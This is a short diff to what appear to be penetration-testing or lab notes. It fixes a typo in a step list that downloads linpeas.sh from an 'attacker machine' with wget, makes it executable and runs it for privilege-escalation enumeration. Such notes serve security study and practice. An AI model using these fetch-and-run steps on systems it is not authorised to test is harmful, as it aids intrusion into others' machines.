@@ -23,7 +23,7 @@ steps : Attacker machine
   3. run command that  download linpeas file attacker machine
   	command : wget http://tun0:port/linpeas.sh 
   4. check the file permission change to excutable file 
-  	commannd : chmod +x linpeas.sh
+  	command : chmod +x linpeas.sh
   5. run file 
   	command : ./linpeas.sh
    
